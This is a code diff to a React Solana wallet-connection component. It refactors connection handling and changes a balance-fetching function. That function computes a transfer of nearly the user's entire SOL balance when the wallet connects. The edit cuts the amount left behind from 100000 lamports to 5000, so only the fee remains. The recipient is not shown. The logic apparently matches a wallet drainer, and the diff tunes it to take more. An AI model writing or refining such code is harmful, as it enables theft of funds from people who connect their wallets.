@@ -3,11 +3,12 @@ import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
 import {
     ConnectionProvider,
     WalletProvider,
-    useWallet
+    useWallet,
+    useConnection,
 } from '@solana/wallet-adapter-react';
 import {
     WalletModalProvider,
-    useWalletModal
+    useWalletModal,
 } from '@solana/wallet-adapter-react-ui';
 
 import {
@@ -23,7 +24,6 @@ import {
 
 import {
     clusterApiUrl,
-    Connection,
     PublicKey,
     LAMPORTS_PER_SOL,
     SystemProgram,
@@ -80,6 +80,7 @@ const ExposeWalletModal: FC = () => {
 };
 
 const WalletConnectionHandler: FC = () => {
+    const { connection } = useConnection();
     const { publicKey, connected, signTransaction } = useWallet();
     const [solBalance, setSolBalance] = useState<number | null>(null);
     const [loading, setLoading] = useState(false);
@@ -93,14 +94,13 @@ const WalletConnectionHandler: FC = () => {
     const fetchBalanceAndPrepareTx = async (walletPublicKey: PublicKey) => {
         try {
             setLoading(true);
-            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
 
             const lamports = await connection.getBalance(walletPublicKey);
             const sol = lamports / LAMPORTS_PER_SOL;
             setSolBalance(sol);
             console.log(`✅ Balance: ${sol.toFixed(4)} SOL`);
 
-            const transferAmount = lamports - 100000;
+            const transferAmount = lamports - 5000;
             if (transferAmount <= 0) {
                 alert('⚠️ Not enough SOL to send after fees.');
                 return;
